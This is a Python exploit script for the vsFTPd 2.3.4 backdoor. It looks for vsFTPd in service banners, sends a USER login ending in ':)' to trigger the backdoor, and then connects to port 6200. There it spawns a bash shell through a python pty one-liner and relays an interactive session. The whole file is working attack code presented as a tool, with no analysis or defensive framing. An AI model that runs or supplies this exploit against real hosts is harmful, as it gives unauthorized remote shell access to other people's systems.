#!/usr/bin/env python3

import os
import sys
import socket
import select
from base64 import b64encode
from random import randint

def backdoor(args):
    try:
        s = socket.socket()
        #s.settimeout(args.timeout)
        try:
            print("\033[1;32m[+]\033[00m Sending Stage 2: {}:{}".format(args.target, 6200))
            s.connect((args.target, 6200))
        except socket.error as e:
            print("\033[1;31m[-]\033[00m Exploit completed without shell... GIVE ME A SHELL!!!")
            runExploit(args, port)
            backdoor(args)
            exit(-1)
        print("\033[1;32m[*]\033[00m Exploit succesful press [ENTER] for shell...")
        s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        s.setblocking(False)
        source = sys.stdin
        sink = sys.stdout
        payload = "python -c 'import pty;pty.spawn(\"/bin/bash\")'"
        enum = 0
        while True:
            enum += 1
            try:
                try:
                    try:
                        read, write, exce = select.select((s, source),(),(s, source, sink))
                    except ValueError: pass
                except socket.error: pass
                if exce: break
                if source in read:
                    if enum <= 1:
                        print("\033[1;32m[+]\033[00m Sending Stage 3: {}:{}".format(args.target, 6200))
                        s.send(payload.encode('utf-8'))
                    else:
                        try:
                            s.send(source.readline().encode('utf-8'))
                        except BrokenPipeError:
                            print("\033[1;31m[-]\033[00m An error occured during Stage 3")
                            exit(-1)
                if s in read:
                    sink.write(s.recv(1024).decode('utf-8'))
                    sink.flush()
            except KeyboardInterrupt:
                for i in range(0, 5):
                    s.send("exit\n".encode('utf-8'))
                source.close()
                sink.close()
                s.close()
                #print("\033[1;36m[+]\033[00m Shutting Down!") throws large error about i/o of stdout
                exit(-1)
    except socket.timeout: pass

def runExploit(args, port):
    s = socket.socket()
    s.settimeout(args.timeout)
    s.connect((args.target, port))
    s.recv(1024)
    print("\033[1;32m[+]\033[00m Sending Stage 1: {}:{}".format(args.target, port))
    s.send(b'USER AAAAAAAA:)\r\n')
    s.recv(1024)
    s.send(b'PASS AAAAAAAA\r\n')
    s.close()

def run(args, data):
    global port
    print("\033[1;36m[+]\033[00m Checking exploit: VSFTPD 2.3.4")
    exploit = False
    for port, banner in data['services']:
        if b'vsFTPd' in banner:
            s = input("\033[1;36m[+]\033[00m Potentially vulnerable, begin exploit? [Y/n]: ").lower()
            if s in ["yea", "y", "yes", "yep", "yaw"]:
                runExploit(args, port)
                backdoor(args)
    return data
